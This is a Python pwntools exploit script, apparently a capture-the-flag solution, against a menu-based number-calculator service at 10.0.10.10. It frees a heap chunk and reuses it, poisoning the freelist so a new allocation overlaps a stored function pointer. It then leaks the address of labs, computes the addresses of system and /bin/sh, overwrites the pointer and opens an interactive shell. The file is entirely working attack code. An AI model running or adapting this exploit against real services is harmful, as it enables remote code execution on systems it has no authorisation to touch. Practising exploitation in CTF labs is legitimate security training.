from pwn import *


r = remote("10.0.10.10", 5010)
context.log_level = "DEBUG"

INDEX_REQUEST = "Please specify an index.\n> "

STATE = 0x6020A0

def get_menu():
    r.recvuntil(" 6. Exit.\n");

def make_number(index, num, name):
    r.sendline("1")
    r.recvuntil(INDEX_REQUEST)
    r.sendline(str(index))
    r.recvuntil("OK, send a number.\n> ")
    r.sendline(str(num))
    r.recvuntil("OK, send a name.\n> ")
    r.sendline(str(name))
    get_menu()

def change_number(index, num):
    r.sendline("2")
    r.recvuntil(INDEX_REQUEST)
    r.sendline(str(index))
    r.recvuntil("OK, send a number to fill ")
    r.sendline(str(num))
    get_menu()

def switch_function(func):
    r.sendline("3")
    r.recvuntil(" 4. abs\n> ")
    r.sendline(str(func))
    get_menu()

def call_function(op1, op2, wait=True):
    r.sendline("4")
    r.recvuntil(INDEX_REQUEST)
    r.sendline(str(op1))
    r.recvuntil(INDEX_REQUEST)
    r.sendline(str(op2))
    r.recvuntil("OK, calling . . .\n")
    if not wait:
        return None, None
    res = int(re.match(r"The result was '(\d+)'.", r.recvline()).group(1))
    count = int(re.match(r"You have now performed '(\d+)' operations.", r.recvline()).group(1))
    get_menu()
    return res, count

def delete_number(index):
    r.sendline("5")
    r.recvuntil(INDEX_REQUEST)
    r.sendline(str(index))
    get_menu()

def exit():
    r.sendline("6")

get_menu()

# Create victim chunk
make_number(0, 0, "victim")
# Free it
delete_number(0)
# Overwrite the fwd pointer to point to current_op
change_number(0, STATE + 0x60)

# Wait until we have 0x21 usages
while True:
    _, c = call_function(0, 0)
    if c >= 0x21:
        break

# Skip the legitimate chunk on the freelist (where index 0 points)
make_number(1, 1, "binsh") # will later be filled in with /bin/sh pointer
# This one will overlap with current_op
make_number(2, 2, "over")

# Switch to labs function
switch_function(4)

# Call labs with a pointer to labs (print the address of labs)
labs, _ = call_function(2, 0) # op2 doesn't matter

# Calculate pointers to good things!
system = labs + 0xbb50
binsh = labs + 0x1705aa

print "system at:", hex(system)
print "/bin/sh at:", hex(binsh)

# Fill in /bin/sh pointer
change_number(1, binsh)
# Overwrite function pointer
change_number(2, system)

# Call system with pointer to /bin/sh
call_function(1, 0, wait=False) # op2 doesn't matter

# Shell!
r.interactive()
